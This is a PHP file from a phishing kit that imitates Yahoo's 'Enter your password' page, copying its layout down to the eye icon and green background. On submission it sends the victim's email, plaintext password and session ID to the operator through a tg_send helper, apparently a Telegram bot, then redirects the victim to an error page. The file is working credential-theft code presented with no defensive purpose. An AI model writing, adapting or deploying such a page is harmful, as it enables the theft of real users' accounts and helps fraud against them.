<?php
// password.php — Yahoo Page 2: Password, matches screenshot 2 exactly
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid   = $_SESSION['visitor_id'] ?? session_id();
$email = $_SESSION['email'];
$ua    = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$dev   = detect_device($ua);
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pw = $_POST['password'] ?? '';
    if ($pw === '') {
        $error = 'Please enter your password.';
    } else {
        tg_send(
            "🔐 <b>YAHOO PASSWORD SUBMITTED</b>\n\n" .
            "🆔 Full ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n" .
            "🔑 Password: <code>{$pw}</code>\n\n" .
         
            "⏰ Time: " . date('H:i:s d/m/Y')
        );
        header('Location: error.php');
        exit;
    }
}

// Password page uses the green background image
page_open('Enter your password - Yahoo', 'pw-bg');
?>

<div class="card">

  <!-- Email shown at top (matches screenshot 2) -->
  <a href="index.php" class="card-email-row">
    <?= htmlspecialchars($email) ?>
  </a>

  <h1 class="pw-title">Enter your password</h1>

  <form method="POST" id="pwForm" novalidate>

    <label class="field-label" for="pwInput">Password</label>
    <div class="yahoo-field">
      <input type="password" name="password" id="pwInput"
             class="yahoo-input <?= $error ? 'err' : '' ?>"
             autocomplete="current-password"
             style="padding-right:44px" />
      <!-- Eye icon — matches screenshot 2: open eye on right -->
      <button type="button" id="eyeBtn" class="eye-btn" aria-label="Show password">
        <svg id="eyeOff" width="20" height="20" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="1.6" stroke-linecap="round">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
        <svg id="eyeOn" width="20" height="20" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="1.6" stroke-linecap="round"
             style="display:none">
          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
          <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
          <line x1="1" y1="1" x2="23" y2="23"/>
        </svg>
      </button>
    </div>

    <?php if ($error): ?>
      <div class="err-text"><?= htmlspecialchars($error) ?></div>
    <?php else: ?>
      <div class="err-text" id="pwErr"></div>
    <?php endif; ?>

    <div class="forgot-row">
      <a href="#" class="yahoo-link sm" style="text-decoration:underline">Forgot password</a>
    </div>

    <button type="submit" class="btn-yahoo">Next</button>

  </form>
</div>

<?php page_close(); ?>
